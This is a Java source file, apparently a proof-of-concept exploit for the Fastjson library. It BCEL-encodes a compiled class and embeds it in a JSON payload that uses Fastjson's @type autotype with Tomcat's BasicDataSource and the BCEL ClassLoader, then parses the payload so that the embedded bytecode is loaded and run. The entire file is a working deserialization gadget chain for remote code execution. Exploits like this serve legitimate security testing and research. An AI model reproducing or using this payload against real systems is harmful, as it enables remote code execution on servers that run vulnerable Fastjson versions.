package com.yyjccc.fastjson.exp;



import com.alibaba.fastjson.JSON;
import com.sun.org.apache.bcel.internal.classfile.Utility;


import javassist.ClassPool;
public class fastJsonBecl {
    public static String bcelEncode(String classFile) throws Exception {

        return "$$BCEL$$" + Utility.encode(ClassPool.getDefault().get(classFile).toBytecode(), true);

    }

    public static void main(String[] args) throws Exception {
        String code = bcelEncode("com.yyjccc.enity.Load");
        String s ="{{\"x\":{\"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\"driverClassName\":\"" + code + "\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"}}}:\"x\"}";
        System.out.println(s);
        JSON.parse(s);
    }
}
